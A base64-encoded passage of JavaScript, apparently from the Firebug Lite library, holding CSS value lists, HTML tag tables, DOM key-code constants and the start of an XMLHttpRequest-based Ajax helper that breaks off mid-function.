DQogICAgICAgICJjaXJjbGUiLA0KICAgICAgICAic3F1YXJlIiwNCiAgICAgICAgImRlY2ltYWwiLA0KICAgICAgICAiZGVjaW1hbC1sZWFkaW5nLXplcm8iLA0KICAgICAgICAibG93ZXItcm9tYW4iLA0KICAgICAgICAidXBwZXItcm9tYW4iLA0KICAgICAgICAibG93ZXItZ3JlZWsiLA0KICAgICAgICAibG93ZXItYWxwaGEiLA0KICAgICAgICAibG93ZXItbGF0aW4iLA0KICAgICAgICAidXBwZXItYWxwaGEiLA0KICAgICAgICAidXBwZXItbGF0aW4iLA0KICAgICAgICAiaGVicmV3IiwNCiAgICAgICAgImFybWVuaWFuIiwNCiAgICAgICAgImdlb3JnaWFuIiwNCiAgICAgICAgImNqay1pZGVvZ3JhcGhpYyIsDQogICAgICAgICJoaXJhZ2FuYSIsDQogICAgICAgICJrYXRha2FuYSIsDQogICAgICAgICJoaXJhZ2FuYS1pcm9oYSIsDQogICAgICAgICJrYXRha2FuYS1pcm9oYSIsDQogICAgICAgICJpbmhlcml0Ig0KICAgIF0sDQoNCiAgICAibGlzdFN0eWxlUG9zaXRpb24iOg0KICAgIFsNCiAgICAgICAgImluc2lkZSIsDQogICAgICAgICJvdXRzaWRlIg0KICAgIF0sDQoNCiAgICAiY29udGVudCI6DQogICAgWw0KICAgICAgICAib3Blbi1xdW90ZSIsDQogICAgICAgICJjbG9zZS1xdW90ZSIsDQogICAgICAgICJuby1vcGVuLXF1b3RlIiwNCiAgICAgICAgIm5vLWNsb3NlLXF1b3RlIiwNCiAgICAgICAgImluaGVyaXQiDQogICAgXSwNCg0KICAgICJmb250U3R5bGUiOg0KICAgIFsNCiAgICAgICAgIm5vcm1hbCIsDQogICAgICAgICJpdGFsaWMiLA0KICAgICAgICAib2JsaXF1ZSIsDQogICAgICAgICJpbmhlcml0Ig0KICAgIF0sDQoNCiAgICAiZm9udFZhcmlhbnQiOg0KICAgIFsNCiAgICAgICAgIm5vcm1hbCIsDQogICAgICAgICJzbWFsbC1jYXBzIiwNCiAgICAgICAgImluaGVyaXQiDQogICAgXSwNCg0KICAgICJmb250V2VpZ2h0IjoNCiAgICBbDQogICAgICAgICJub3JtYWwiLA0KICAgICAgICAiYm9sZCIsDQogICAgICAgICJib2xkZXIiLA0KICAgICAgICAibGlnaHRlciIsDQogICAgICAgICJpbmhlcml0Ig0KICAgIF0sDQoNCiAgICAiZm9udFNpemUiOg0KICAgIFsNCiAgICAgICAgInh4LXNtYWxsIiwNCiAgICAgICAgIngtc21hbGwiLA0KICAgICAgICAic21hbGwiLA0KICAgICAgICAibWVkaXVtIiwNCiAgICAgICAgImxhcmdlIiwNCiAgICAgICAgIngtbGFyZ2UiLA0KICAgICAgICAieHgtbGFyZ2UiLA0KICAgICAgICAic21hbGxlciIsDQogICAgICAgICJsYXJnZXIiDQogICAgXSwNCg0KICAgICJmb250RmFtaWx5IjoNCiAgICBbDQogICAgICAgICJBcmlhbCIsDQogICAgICAgICJDb21pYyBTYW5zIE1TIiwNCiAgICAgICAgIkdlb3JnaWEiLA0KICAgICAgICAiVGFob21hIiwNCiAgICAgICAgIlZlcmRhbmEiLA0KICAgICAgICAiVGltZXMgTmV3IFJvbWFuIiwNCiAgICAgICAgIlRyZWJ1Y2hldCBNUyIsDQogICAgICAgICJMdWNpZGEgR3JhbmRlIiwNCiAgICAgICAgIkhlbHZldGljYSIsDQogICAgICAgICJzZXJpZiIsDQogICAgICAgICJzYW5zLXNlcmlmIiwNCiAgICAgICAgImN1cnNpdmUiLA0KICAgICAgICAiZmFudGFzeSIsDQogICAgICAgICJtb25vc3BhY2UiLA0KICAgICAgICAiY2FwdGlvbiIsDQogICAgICAgICJpY29uIiwNCiAgICAgICAgIm1lbnUiLA0KICAgICAgICAibWVzc2FnZS1ib3giLA0KICAgICAgICAic21hbGwtY2FwdGlvbiIsDQogICAgICAgICJzdGF0dXMtYmFyIiwNCiAgICAgICAgImluaGVyaXQiDQogICAgXSwNCg0KICAgICJkaXNwbGF5IjoNCiAgICBbDQogICAgICAgICJibG9jayIsDQogICAgICAgICJpbmxpbmUiLA0KICAgICAgICAiaW5saW5lLWJsb2NrIiwNCiAgICAgICAgImxpc3QtaXRlbSIsDQogICAgICAgICJtYXJrZXIiLA0KICAgICAgICAicnVuLWluIiwNCiAgICAgICAgImNvbXBhY3QiLA0KICAgICAgICAidGFibGUiLA0KICAgICAgICAiaW5saW5lLXRhYmxlIiwNCiAgICAgICAgInRhYmxlLXJvdy1ncm91cCIsDQogICAgICAgICJ0YWJsZS1jb2x1bW4iLA0KICAgICAgICAidGFibGUtY29sdW1uLWdyb3VwIiwNCiAgICAgICAgInRhYmxlLWhlYWRlci1ncm91cCIsDQogICAgICAgICJ0YWJsZS1mb290ZXItZ3JvdXAiLA0KICAgICAgICAidGFibGUtcm93IiwNCiAgICAgICAgInRhYmxlLWNlbGwiLA0KICAgICAgICAidGFibGUtY2FwdGlvbiIsDQogICAgICAgICItbW96LWJveCIsDQogICAgICAgICItbW96LWNvbXBhY3QiLA0KICAgICAgICAiLW1vei1kZWNrIiwNCiAgICAgICAgIi1tb3otZ3JpZCIsDQogICAgICAgICItbW96LWdyaWQtZ3JvdXAiLA0KICAgICAgICAiLW1vei1ncmlkLWxpbmUiLA0KICAgICAgICAiLW1vei1ncm91cGJveCIsDQogICAgICAgICItbW96LWlubGluZS1ibG9jayIsDQogICAgICAgICItbW96LWlubGluZS1ib3giLA0KICAgICAgICAiLW1vei1pbmxpbmUtZ3JpZCIsDQogICAgICAgICItbW96LWlubGluZS1zdGFjayIsDQogICAgICAgICItbW96LWlubGluZS10YWJsZSIsDQogICAgICAgICItbW96LW1hcmtlciIsDQogICAgICAgICItbW96LXBvcHVwIiwNCiAgICAgICAgIi1tb3otcnVuaW4iLA0KICAgICAgICAiLW1vei1zdGFjayINCiAgICBdLA0KDQogICAgInBvc2l0aW9uIjoNCiAgICBbDQogICAgICAgICJzdGF0aWMiLA0KICAgICAgICAicmVsYXRpdmUiLA0KICAgICAgICAiYWJzb2x1dGUiLA0KICAgICAgICAiZml4ZWQiLA0KICAgICAgICAiaW5oZXJpdCINCiAgICBdLA0KDQogICAgImZsb2F0IjoNCiAgICBbDQogICAgICAgICJsZWZ0IiwNCiAgICAgICAgInJpZ2h0Ig0KICAgIF0sDQoNCiAgICAidGV4dEFsaWduIjoNCiAgICBbDQogICAgICAgICJsZWZ0IiwNCiAgICAgICAgInJpZ2h0IiwNCiAgICAgICAgImNlbnRlciIsDQogICAgICAgICJqdXN0aWZ5Ig0KICAgIF0sDQoNCiAgICAidGFibGVMYXlvdXQiOg0KICAgIFsNCiAgICAgICAgImZpeGVkIg0KICAgIF0sDQoNCiAgICAidGV4dERlY29yYXRpb24iOg0KICAgIFsNCiAgICAgICAgInVuZGVybGluZSIsDQogICAgICAgICJvdmVybGluZSIsDQogICAgICAgICJsaW5lLXRocm91Z2giLA0KICAgICAgICAiYmxpbmsiDQogICAgXSwNCg0KICAgICJ0ZXh0VHJhbnNmb3JtIjoNCiAgICBbDQogICAgICAgICJjYXBpdGFsaXplIiwNCiAgICAgICAgImxvd2VyY2FzZSIsDQogICAgICAgICJ1cHBlcmNhc2UiLA0KICAgICAgICAiaW5oZXJpdCINCiAgICBdLA0KDQogICAgInVuaWNvZGVCaWRpIjoNCiAgICBbDQogICAgICAgICJub3JtYWwiLA0KICAgICAgICAiZW1iZWQiLA0KICAgICAgICAiYmlkaS1vdmVycmlkZSINCiAgICBdLA0KDQogICAgIndoaXRlU3BhY2UiOg0KICAgIFsNCiAgICAgICAgIm5vcm1hbCIsDQogICAgICAgICJwcmUiLA0KICAgICAgICAibm93cmFwIg0KICAgIF0sDQoNCiAgICAidmVydGljYWxBbGlnbiI6DQogICAgWw0KICAgICAgICAiYmFzZWxpbmUiLA0KICAgICAgICAic3ViIiwNCiAgICAgICAgInN1cGVyIiwNCiAgICAgICAgInRvcCIsDQogICAgICAgICJ0ZXh0LXRvcCIsDQogICAgICAgICJtaWRkbGUiLA0KICAgICAgICAiYm90dG9tIiwNCiAgICAgICAgInRleHQtYm90dG9tIiwNCiAgICAgICAgImluaGVyaXQiDQogICAgXSwNCg0KICAgICJ0aGlja25lc3MiOg0KICAgIFsNCiAgICAgICAgInRoaW4iLA0KICAgICAgICAibWVkaXVtIiwNCiAgICAgICAgInRoaWNrIg0KICAgIF0sDQoNCiAgICAidXNlckZvY3VzIjoNCiAgICBbDQogICAgICAgICJpZ25vcmUiLA0KICAgICAgICAibm9ybWFsIg0KICAgIF0sDQoNCiAgICAidXNlcklucHV0IjoNCiAgICBbDQogICAgICAgICJkaXNhYmxlZCIsDQogICAgICAgICJlbmFibGVkIg0KICAgIF0sDQoNCiAgICAidXNlclNlbGVjdCI6DQogICAgWw0KICAgICAgICAibm9ybWFsIg0KICAgIF0sDQoNCiAgICAibW96Qm94U2l6aW5nIjoNCiAgICBbDQogICAgICAgICJjb250ZW50LWJveCIsDQogICAgICAgICJwYWRkaW5nLWJveCIsDQogICAgICAgICJib3JkZXItYm94Ig0KICAgIF0sDQoNCiAgICAibW96Qm94QWxpZ24iOg0KICAgIFsNCiAgICAgICAgInN0YXJ0IiwNCiAgICAgICAgImNlbnRlciIsDQogICAgICAgICJlbmQiLA0KICAgICAgICAiYmFzZWxpbmUiLA0KICAgICAgICAic3RyZXRjaCINCiAgICBdLA0KDQogICAgIm1vekJveERpcmVjdGlvbiI6DQogICAgWw0KICAgICAgICAibm9ybWFsIiwNCiAgICAgICAgInJldmVyc2UiDQogICAgXSwNCg0KICAgICJtb3pCb3hPcmllbnQiOg0KICAgIFsNCiAgICAgICAgImhvcml6b250YWwiLA0KICAgICAgICAidmVydGljYWwiDQogICAgXSwNCg0KICAgICJtb3pCb3hQYWNrIjoNCiAgICBbDQogICAgICAgICJzdGFydCIsDQogICAgICAgICJjZW50ZXIiLA0KICAgICAgICAiZW5kIg0KICAgIF0NCn07DQoNCnRoaXMubm9uRWRpdGFibGVUYWdzID0NCnsNCiAgICAiSFRNTCI6IDEsDQogICAgIkhFQUQiOiAxLA0KICAgICJodG1sIjogMSwNCiAgICAiaGVhZCI6IDENCn07DQoNCnRoaXMuaW5uZXJFZGl0YWJsZVRhZ3MgPQ0Kew0KICAgICJCT0RZIjogMSwNCiAgICAiYm9keSI6IDENCn07DQoNCnRoaXMuc2VsZkNsb3NpbmdUYWdzID0NCnsgLy8gRW5kIHRhZ3MgZm9yIHZvaWQgZWxlbWVudHMgYXJlIGZvcmJpZGRlbiBodHRwOi8vd2lraS53aGF0d2cub3JnL3dpa2kvSFRNTF92cy5fWEhUTUwNCiAgICAibWV0YSI6IDEsDQogICAgImxpbmsiOiAxLA0KICAgICJhcmVhIjogMSwNCiAgICAiYmFzZSI6IDEsDQogICAgImNvbCI6IDEsDQogICAgImlucHV0IjogMSwNCiAgICAiaW1nIjogMSwNCiAgICAiYnIiOiAxLA0KICAgICJociI6IDEsDQogICAgInBhcmFtIjoxLA0KICAgICJlbWJlZCI6MQ0KfTsNCg0KdmFyIGludmlzaWJsZVRhZ3MgPSB0aGlzLmludmlzaWJsZVRhZ3MgPQ0Kew0KICAgICJIVE1MIjogMSwNCiAgICAiSEVBRCI6IDEsDQogICAgIlRJVExFIjogMSwNCiAgICAiTUVUQSI6IDEsDQogICAgIkxJTksiOiAxLA0KICAgICJTVFlMRSI6IDEsDQogICAgIlNDUklQVCI6IDEsDQogICAgIk5PU0NSSVBUIjogMSwNCiAgICAiQlIiOiAxLA0KICAgICJQQVJBTSI6IDEsDQogICAgIkNPTCI6IDEsDQoNCiAgICAiaHRtbCI6IDEsDQogICAgImhlYWQiOiAxLA0KICAgICJ0aXRsZSI6IDEsDQogICAgIm1ldGEiOiAxLA0KICAgICJsaW5rIjogMSwNCiAgICAic3R5bGUiOiAxLA0KICAgICJzY3JpcHQiOiAxLA0KICAgICJub3NjcmlwdCI6IDEsDQogICAgImJyIjogMSwNCiAgICAicGFyYW0iOiAxLA0KICAgICJjb2wiOiAxDQogICAgLyoNCiAgICAid2luZG93IjogMSwNCiAgICAiYnJvd3NlciI6IDEsDQogICAgImZyYW1lIjogMSwNCiAgICAidGFiYnJvd3NlciI6IDEsDQogICAgIldJTkRPVyI6IDEsDQogICAgIkJST1dTRVIiOiAxLA0KICAgICJGUkFNRSI6IDEsDQogICAgIlRBQkJST1dTRVIiOiAxLA0KICAgICovDQp9Ow0KDQoNCmlmICh0eXBlb2YgS2V5RXZlbnQgPT0gInVuZGVmaW5lZCIpIHsNCiAgICB0aGlzLktleUV2ZW50ID0gew0KICAgICAgICBET01fVktfQ0FOQ0VMOiAzLA0KICAgICAgICBET01fVktfSEVMUDogNiwNCiAgICAgICAgRE9NX1ZLX0JBQ0tfU1BBQ0U6IDgsDQogICAgICAgIERPTV9WS19UQUI6IDksDQogICAgICAgIERPTV9WS19DTEVBUjogMTIsDQogICAgICAgIERPTV9WS19SRVRVUk46IDEzLA0KICAgICAgICBET01fVktfRU5URVI6IDE0LA0KICAgICAgICBET01fVktfU0hJRlQ6IDE2LA0KICAgICAgICBET01fVktfQ09OVFJPTDogMTcsDQogICAgICAgIERPTV9WS19BTFQ6IDE4LA0KICAgICAgICBET01fVktfUEFVU0U6IDE5LA0KICAgICAgICBET01fVktfQ0FQU19MT0NLOiAyMCwNCiAgICAgICAgRE9NX1ZLX0VTQ0FQRTogMjcsDQogICAgICAgIERPTV9WS19TUEFDRTogMzIsDQogICAgICAgIERPTV9WS19QQUdFX1VQOiAzMywNCiAgICAgICAgRE9NX1ZLX1BBR0VfRE9XTjogMzQsDQogICAgICAgIERPTV9WS19FTkQ6IDM1LA0KICAgICAgICBET01fVktfSE9NRTogMzYsDQogICAgICAgIERPTV9WS19MRUZUOiAzNywNCiAgICAgICAgRE9NX1ZLX1VQOiAzOCwNCiAgICAgICAgRE9NX1ZLX1JJR0hUOiAzOSwNCiAgICAgICAgRE9NX1ZLX0RPV046IDQwLA0KICAgICAgICBET01fVktfUFJJTlRTQ1JFRU46IDQ0LA0KICAgICAgICBET01fVktfSU5TRVJUOiA0NSwNCiAgICAgICAgRE9NX1ZLX0RFTEVURTogNDYsDQogICAgICAgIERPTV9WS18wOiA0OCwNCiAgICAgICAgRE9NX1ZLXzE6IDQ5LA0KICAgICAgICBET01fVktfMjogNTAsDQogICAgICAgIERPTV9WS18zOiA1MSwNCiAgICAgICAgRE9NX1ZLXzQ6IDUyLA0KICAgICAgICBET01fVktfNTogNTMsDQogICAgICAgIERPTV9WS182OiA1NCwNCiAgICAgICAgRE9NX1ZLXzc6IDU1LA0KICAgICAgICBET01fVktfODogNTYsDQogICAgICAgIERPTV9WS185OiA1NywNCiAgICAgICAgRE9NX1ZLX1NFTUlDT0xPTjogNTksDQogICAgICAgIERPTV9WS19FUVVBTFM6IDYxLA0KICAgICAgICBET01fVktfQTogNjUsDQogICAgICAgIERPTV9WS19COiA2NiwNCiAgICAgICAgRE9NX1ZLX0M6IDY3LA0KICAgICAgICBET01fVktfRDogNjgsDQogICAgICAgIERPTV9WS19FOiA2OSwNCiAgICAgICAgRE9NX1ZLX0Y6IDcwLA0KICAgICAgICBET01fVktfRzogNzEsDQogICAgICAgIERPTV9WS19IOiA3MiwNCiAgICAgICAgRE9NX1ZLX0k6IDczLA0KICAgICAgICBET01fVktfSjogNzQsDQogICAgICAgIERPTV9WS19LOiA3NSwNCiAgICAgICAgRE9NX1ZLX0w6IDc2LA0KICAgICAgICBET01fVktfTTogNzcsDQogICAgICAgIERPTV9WS19OOiA3OCwNCiAgICAgICAgRE9NX1ZLX086IDc5LA0KICAgICAgICBET01fVktfUDogODAsDQogICAgICAgIERPTV9WS19ROiA4MSwNCiAgICAgICAgRE9NX1ZLX1I6IDgyLA0KICAgICAgICBET01fVktfUzogODMsDQogICAgICAgIERPTV9WS19UOiA4NCwNCiAgICAgICAgRE9NX1ZLX1U6IDg1LA0KICAgICAgICBET01fVktfVjogODYsDQogICAgICAgIERPTV9WS19XOiA4NywNCiAgICAgICAgRE9NX1ZLX1g6IDg4LA0KICAgICAgICBET01fVktfWTogODksDQogICAgICAgIERPTV9WS19aOiA5MCwNCiAgICAgICAgRE9NX1ZLX0NPTlRFWFRfTUVOVTogOTMsDQogICAgICAgIERPTV9WS19OVU1QQUQwOiA5NiwNCiAgICAgICAgRE9NX1ZLX05VTVBBRDE6IDk3LA0KICAgICAgICBET01fVktfTlVNUEFEMjogOTgsDQogICAgICAgIERPTV9WS19OVU1QQUQzOiA5OSwNCiAgICAgICAgRE9NX1ZLX05VTVBBRDQ6IDEwMCwNCiAgICAgICAgRE9NX1ZLX05VTVBBRDU6IDEwMSwNCiAgICAgICAgRE9NX1ZLX05VTVBBRDY6IDEwMiwNCiAgICAgICAgRE9NX1ZLX05VTVBBRDc6IDEwMywNCiAgICAgICAgRE9NX1ZLX05VTVBBRDg6IDEwNCwNCiAgICAgICAgRE9NX1ZLX05VTVBBRDk6IDEwNSwNCiAgICAgICAgRE9NX1ZLX01VTFRJUExZOiAxMDYsDQogICAgICAgIERPTV9WS19BREQ6IDEwNywNCiAgICAgICAgRE9NX1ZLX1NFUEFSQVRPUjogMTA4LA0KICAgICAgICBET01fVktfU1VCVFJBQ1Q6IDEwOSwNCiAgICAgICAgRE9NX1ZLX0RFQ0lNQUw6IDExMCwNCiAgICAgICAgRE9NX1ZLX0RJVklERTogMTExLA0KICAgICAgICBET01fVktfRjE6IDExMiwNCiAgICAgICAgRE9NX1ZLX0YyOiAxMTMsDQogICAgICAgIERPTV9WS19GMzogMTE0LA0KICAgICAgICBET01fVktfRjQ6IDExNSwNCiAgICAgICAgRE9NX1ZLX0Y1OiAxMTYsDQogICAgICAgIERPTV9WS19GNjogMTE3LA0KICAgICAgICBET01fVktfRjc6IDExOCwNCiAgICAgICAgRE9NX1ZLX0Y4OiAxMTksDQogICAgICAgIERPTV9WS19GOTogMTIwLA0KICAgICAgICBET01fVktfRjEwOiAxMjEsDQogICAgICAgIERPTV9WS19GMTE6IDEyMiwNCiAgICAgICAgRE9NX1ZLX0YxMjogMTIzLA0KICAgICAgICBET01fVktfRjEzOiAxMjQsDQogICAgICAgIERPTV9WS19GMTQ6IDEyNSwNCiAgICAgICAgRE9NX1ZLX0YxNTogMTI2LA0KICAgICAgICBET01fVktfRjE2OiAxMjcsDQogICAgICAgIERPTV9WS19GMTc6IDEyOCwNCiAgICAgICAgRE9NX1ZLX0YxODogMTI5LA0KICAgICAgICBET01fVktfRjE5OiAxMzAsDQogICAgICAgIERPTV9WS19GMjA6IDEzMSwNCiAgICAgICAgRE9NX1ZLX0YyMTogMTMyLA0KICAgICAgICBET01fVktfRjIyOiAxMzMsDQogICAgICAgIERPTV9WS19GMjM6IDEzNCwNCiAgICAgICAgRE9NX1ZLX0YyNDogMTM1LA0KICAgICAgICBET01fVktfTlVNX0xPQ0s6IDE0NCwNCiAgICAgICAgRE9NX1ZLX1NDUk9MTF9MT0NLOiAxNDUsDQogICAgICAgIERPTV9WS19DT01NQTogMTg4LA0KICAgICAgICBET01fVktfUEVSSU9EOiAxOTAsDQogICAgICAgIERPTV9WS19TTEFTSDogMTkxLA0KICAgICAgICBET01fVktfQkFDS19RVU9URTogMTkyLA0KICAgICAgICBET01fVktfT1BFTl9CUkFDS0VUOiAyMTksDQogICAgICAgIERPTV9WS19CQUNLX1NMQVNIOiAyMjAsDQogICAgICAgIERPTV9WS19DTE9TRV9CUkFDS0VUOiAyMjEsDQogICAgICAgIERPTV9WS19RVU9URTogMjIyLA0KICAgICAgICBET01fVktfTUVUQTogMjI0DQogICAgfTsNCn0NCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCi8vIEFqYXgNCg0KLyoqDQogKiBAbmFtZXNwYWNlDQogKi8NCnRoaXMuQWpheCA9DQp7DQogIA0KICAgIHJlcXVlc3RzOiBbXSwNCiAgICB0cmFuc3BvcnQ6IG51bGwsDQogICAgc3RhdGVzOiBbIlVuaW5pdGlhbGl6ZWQiLCJMb2FkaW5nIiwiTG9hZGVkIiwiSW50ZXJhY3RpdmUiLCJDb21wbGV0ZSJdLA0KICANCiAgICBpbml0aWFsaXplOiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICB0aGlzLnRyYW5zcG9ydCA9IEZCTC5nZXROYXRpdmVYSFJPYmplY3QoKTsNCiAgICB9LA0KICAgIA0KICAgIGdldFhIUk9iamVjdDogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgdmFyIHhock9iaiA9IGZhbHNlOw0KICAgICAgICB0cnkNCiAgICAgICAgew0KICAgICAgICAgICAgeGhyT2JqID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2goZSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHByb2dpZCA9IFsNCiAgICAgICAgICAgICAgICAgICAgIk1TWE1MMi5YTUxIVFRQLjUuMCIsICJNU1hNTDIuWE1MSFRUUC40LjAiLCANCiAgICAgICAgICAgICAgICAgICAgIk1TWE1MMi5YTUxIVFRQLjMuMCIsICJNU1hNTDIuWE1MSFRUUCIsICJNaWNyb3NvZnQuWE1MSFRUUCINCiAgICAgICAgICAgICAgICBdOw0KICAgICAgICAgICAgICANCiAgICAgICAgICAgIGZvciAoIHZhciBpPTA7IGkgPCBwcm9naWQubGVuZ3RoOyArK2kgKSB7DQogICAgICAgICAgICAgICAgdHJ5DQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICB4aHJPYmogPSBuZXcgQWN0aXZlWE9iamVjdChwcm9naWRbaV0pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaChlKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIGZpbmFsbHkNCiAgICAgICAgew0KICAgICAgICAgICAgcmV0dXJuIHhock9iajsNCiAgICAgICAgfQ0KICAgIH0sDQogICAgDQogICAgDQogICAgLyoqDQogICAgICogQ3JlYXRlIGEgQUpBWCByZXF1ZXN0Lg0KICAgICAqIA0KICAgICAqIEBuYW1lIHJlcXVlc3QNCiAgICAgKiBAcGFyYW0ge09iamVjdH0gICBvcHRpb25zICAgICAgICAgICAgICAgcmVxdWVzdCBvcHRpb25zDQogICAgICogQHBhcmFtIHtTdHJpbmd9ICAgb3B0aW9ucy51cmwgICAgICAgICAgIFVSTCB0byBiZSByZXF1ZXN0ZWQNCiAgICAgKiBAcGFyYW0ge1N0cmluZ30gICBvcHRpb25zLnR5cGUgICAgICAgICAgUmVxdWVzdCB0eXBlICgiZ2V0IiBvdSAicG9zdCIpLiBEZWZhdWx0IGlzICJnZXQiLg0KICAgICAqIEBwYXJhbSB7Qm9vbGVhbn0gIG9wdGlvbnMuYXN5bmMgICAgICAgICBBc3luY2hyb25vdXMgZmxhZy4gRGVmYXVsdCBpcyAidHJ1ZSIuICAgDQogICAgICogQHBhcmFtIHtTdHJpbmd9ICAgb3B0aW9ucy5kYXRhVHlwZSAgICAgIERhdGEgdHlwZSAoInRleHQiLCAiaHRtbCIsICJ4bWwiIG9yICJqc29uIikuIERlZmF1bHQgaXMgInRleHQiLg0KICAgICAqIEBwYXJhbSB7U3RyaW5nfSAgIG9wdGlvbnMuY29udGVudFR5cGUgICBDb250ZW50LXR5cGUgb2YgdGhlIGRhdGEgYmVpbmcgc2VudC4gRGVmYXVsdCBpcyAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIi4gIA0KICAgICAqIEBwYXJhbSB7RnVuY3Rpb259IG9wdGlvbnMub25Mb2FkaW5nICAgICBvbkxvYWRpbmcgY2FsbGJhY2sNCiAgICAgKiBAcGFyYW0ge0Z1bmN0aW9ufSBvcHRpb25zLm9uTG9hZGVkICAgICAgb25Mb2FkZWQgY2FsbGJhY2sNCiAgICAgKiBAcGFyYW0ge0Z1bmN0aW9ufSBvcHRpb25zLm9uSW50ZXJhY3RpdmUgb25JbnRlcmFjdGl2ZSBjYWxsYmFjaw0KICAgICAqIEBwYXJhbSB7RnVuY3Rpb259IG9wdGlvbnMub25Db21wbGV0ZSAgICBvbkNvbXBsZXRlIGNhbGxiYWNrDQogICAgICogQHBhcmFtIHtGdW5jdGlvbn0gb3B0aW9ucy5vblVwZGF0ZSAgICAgIG9uVXBkYXRlIGNhbGxiYWNrDQogICAgICogQHBhcmFtIHtGdW5jdGlvbn0gb3B0aW9ucy5vblN1Y2Nlc3MgICAgIG9uU3VjY2VzcyBjYWxsYmFjaw0KICAgICAqIEBwYXJhbSB7RnVuY3Rpb259IG9wdGlvbnMub25GYWlsdXJlICAgICBvbkZhaWx1cmUgY2FsbGJhY2sNCiAgICAgKi8gICAgICANCiAgICByZXF1ZXN0OiBmdW5jdGlvbihvcHRpb25zKQ0KICAgIHsNCiAgICAgICAgLy8gcHJvY2VzcyBvcHRpb25zDQogICAgICAgIHZhciBvID0gRkJMLmV4dGVuZCgNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIC8vIGRlZmF1bHQgdmFsdWVzDQogICAgICAgICAgICAgICAgICAgIHR5cGU6ICJnZXQiLA0KICAgICAgICAgICAgICAgICAgICBhc3luYzogdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgZGF0YVR5cGU6ICJ0ZXh0IiwNCiAgICAgICAgICAgICAgICAgICAgY29udGVudFR5cGU6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiDQogICAgICAgICAgICAgICAgfSwgDQogICAgICAgICAgICAgICAgb3B0aW9ucyB8fCB7fQ0KICAgICAgICAgICAgKTsNCiAgICANCiAgICAgICAgdGhpcy5yZXF1ZXN0cy5wdXNoKG8pOw0KICAgIA0KICAgICAgICB2YXIgcyA9IHRoaXMuZ2V0U3RhdGUoKTsNCiAgICAgICAgaWYgKHMgPT0gIlVuaW5pdGlhbGl6ZWQiIHx8IHMgPT0gIkNvbXBsZXRlIiB8fCBzID09ICJMb2FkZWQiKSANCiAgICAgICAgICAgIHRoaXMuc2VuZFJlcXVlc3QoKTsNCiAgICB9LA0KICAgIA0KICAgIHNlcmlhbGl6ZTogZnVuY3Rpb24oZGF0YSkNCiAgICB7DQogICAgICAgIHZhciByID0gWyIiXSwgcmwgPSAwOw0KICAgICAgICBpZiAoZGF0YSkgew0KICAgICAgICAgICAgaWYgKHR5cGVvZiBkYXRhID09ICJzdHJpbmciKSAgcltybCsrXSA9IGRhdGE7DQogICAgICAgICAgICAgIA0KICAgICAgICAgICAgZWxzZSBpZiAoZGF0YS5pbm5lckhUTUwgJiYgZGF0YS5lbGVtZW50cykgew0KICAgICAgICAgICAgICAgIGZvciAodmFyIGk9MCxlbCxsPShlbD1kYXRhLmVsZW1lbnRzKS5sZW5ndGg7IGkgPCBsOyBpKyspDQogICAgICAgICAgICAgICAgICAgIGlmIChlbFtpXS5uYW1lKSB7DQogICAgICAgICAgICAgICAgICAgICAgICByW3JsKytdID0gZW5jb2RlVVJJQ29tcG9uZW50KGVsW2ldLm5hbWUpOyANCiAgICAgICAgICAgICAgICAgICAgICAgIHJbcmwrK10gPSAiPSI7DQogICAgICAgICAgICAgICAgICAgICAgICByW3JsKytdID0gZW5jb2RlVVJJQ29tcG9uZW50KGVsW2ldLnZhbHVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJbcmwrK10gPSAiJiI7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICB9IGVsc2UgDQogICAgICAgICAgICAgICAgZm9yKHZhciBwYXJhbSBpbiBkYXRhKSB7DQogICAgICAgICAgICAgICAgICAgIHJbcmwrK10gPSBlbmNvZGVVUklDb21wb25lbnQocGFyYW0pOyANCiAgICAgICAgICAgICAgICAgICAgcltybCsrXSA9ICI9IjsNCiAgICAgICAgICAgICAgICAgICAgcltybCsrXSA9IGVuY29kZVVSSUNvbXBvbmVudChkYXRhW3BhcmFtXSk7DQogICAgICAgICAgICAgICAgICAgIHJbcmwrK10gPSAiJiI7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiByLmpvaW4oIiIpLnJlcGxhY2UoLyYkLywgIiIpOw0KICAgIH0sDQogIA0KICAgIHNlbmRSZXF1ZXN0OiBmdW5jdGlvbigpDQogICAgew0KICAgICAgICB2YXIgdCA9IEZCTC5BamF4LnRyYW5zcG9ydCwgciA9IEZCTC5BamF4LnJlcXVlc3RzLnNoaWZ0KCksIGRhdGE7DQogICAgDQogICAgICAgIC8vIG9wZW4gWEhSIG9iamVjdA0KICAgICAgICB0Lm9wZW4oci50eXBlLCByLnVybCwgci5hc3luYyk7DQogICAgDQogICAgICAgIC8vc2V0UmVxdWVzdEhlYWRlcnMoKTsNCiAgICANCiAgICAgICAgLy8gaW5kaWNhdGVzIHRoYXQgaXQgaXMgYSBYSFIgcmVxdWVzdCB0byB0aGUgc2VydmVyDQogICAgICAgIHQuc2V0UmVxdWVzdEhlYWRlcigiWC1SZXF1ZXN0ZWQtV2l0aCIsICJYTUxIdHRwUmVxdWVzdCIpOw0KICAgIA0KICAgICAgICAvLyBpZiBkYXRhIGlzIGJlaW5nIHNlbnQsIHNldHMgdGhlIGFwcHJvcHJpYXRlIGNvbnRlbnQtdHlwZQ0KICAgICAgICBpZiAoZGF0YSA